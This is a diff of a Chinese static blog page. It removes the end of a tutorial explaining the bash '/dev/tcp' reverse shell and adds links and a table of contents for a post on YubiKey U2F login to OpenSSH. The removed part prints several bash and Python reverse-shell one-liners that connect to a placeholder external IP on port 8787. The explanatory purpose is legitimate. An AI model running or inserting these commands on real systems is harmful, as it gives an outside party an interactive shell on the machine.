-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;外网机器IP&#x2F;8787 0&gt;&amp;1</span></pre></td></tr></table></figure>
-<p>当然在 bash 下执行是没问题的但是在其他 shell 下执行会报错所以更健壮的写法是 </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;外网机器IP&#x2F;8787 0&gt;&amp;1&#39;</span></pre></td></tr></table></figure>
-<p>实际上还可以这样写</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">bash -c &#39;bash -i &amp;&gt; &#x2F;dev&#x2F;tcp&#x2F;外网机器IP&#x2F;8787 &lt;&amp;1&#39;</span></pre></td></tr></table></figure>
-<h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h2><p>网上传的很多语言的脚本也是利用这个原理,反弹一个shell让我们控制，看下利用的条件 </p>
-<ul>
-<li>支持 tcp 链接</li>
-<li>支持 IO 重定向</li>
-<li>可以调用系统命令</li>
-</ul>
-<p>只要满足这三个你熟知的语言都可以替换掉这行命令</p>
-<p>下面贴一个Python的反弹shell</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("XXX.XXX.XXX.XXX",8787));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span></span></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">s.connect((<span class="string">"外网机器IP"</span>,<span class="number">8787</span>))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">p=subprocess.call([<span class="string">"/bin/bash"</span>,<span class="string">"-i"</span>])</span></pre></td></tr></table></figure>
-<h2 id="5-致谢"><a href="#5-致谢" class="headerlink" title="5. 致谢"></a>5. 致谢</h2><p>谢谢小明同学和小陈同学给出的中肯意见。</p>
+<li><p><a href="https://developers.yubico.com/libfido2/" target="_blank" rel="noopener">Yubico libfido2</a></p>
+</li>
+<li><p><a href="https://blog.51cto.com/solarboy/2287656" target="_blank" rel="noopener">FIDO U2F应用与开发(一)-原理与协议</a></p>
+</li>
+</ol>
 
       
     </div>
@@ -487,11 +483,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Linux/" rel="tag"># Linux</a>
-          
-            <a href="/tags/bash/" rel="tag"># bash</a>
-          
-            <a href="/tags/shell/" rel="tag"># shell</a>
+            <a href="/tags/OpenSSH/" rel="tag"># OpenSSH</a>
           
         </div>
       
@@ -504,8 +496,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/01/prometheus_install/" rel="next" title="Prometheus 安装">
-                <i class="fa fa-chevron-left"></i> Prometheus 安装
+              <a href="/2020/03/http-ssl/" rel="next" title="2020/03/http-ssl">
+                <i class="fa fa-chevron-left"></i> 2020/03/http-ssl
               </a>
             
           </div>
@@ -513,10 +505,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/01/exec_tee_a_i_test_log_subshell/" rel="prev" title="理解 exec &> >(tee -a -i test.log) 之 subshell">
-                理解 exec &> >(tee -a -i test.log) 之 subshell <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -669,7 +657,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-什么是-dev-tcp-dev-udp"><span class="nav-number">1.</span> <span class="nav-text">1. 什么是/dev/tcp/ /dev/udp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-理解bash-i-gt-amp-dev-tcp-localhost-8080-0-gt-amp-1"><span class="nav-number">2.</span> <span class="nav-text">2. 理解bash -i &gt;&amp; /dev/tcp/localhost/8080 0&gt;&amp;1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-实验"><span class="nav-number">3.</span> <span class="nav-text">3. 实验</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-总结"><span class="nav-number">4.</span> <span class="nav-text">4. 总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-致谢"><span class="nav-number">5.</span> <span class="nav-text">5. 致谢</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#使用-YubiKey-u2f-认证方式登录OpenSSH-Server"><span class="nav-number">1.</span> <span class="nav-text">使用 YubiKey u2f 认证方式登录OpenSSH Server</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">2.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#新版openSSH介绍"><span class="nav-number">2.1.</span> <span class="nav-text">新版openSSH介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#yubikey"><span class="nav-number">2.2.</span> <span class="nav-text">yubikey</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#OpenSSH-为-u2f-增加的新的秘钥类型"><span class="nav-number">2.3.</span> <span class="nav-text">OpenSSH 为 u2f 增加的新的秘钥类型</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#配置过程"><span class="nav-number">3.</span> <span class="nav-text">配置过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#客户端-macOS-10-15-3"><span class="nav-number">3.1.</span> <span class="nav-text">客户端(macOS 10.15.3)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#服务器端-OpenBSD-6-6"><span class="nav-number">3.2.</span> <span class="nav-text">服务器端(OpenBSD 6.6)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他客户端问题"><span class="nav-number">3.3.</span> <span class="nav-text">其他客户端问题</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考文档"><span class="nav-number">4.</span> <span class="nav-text">参考文档</span></a></li></ol></div>
             
 
           </div>
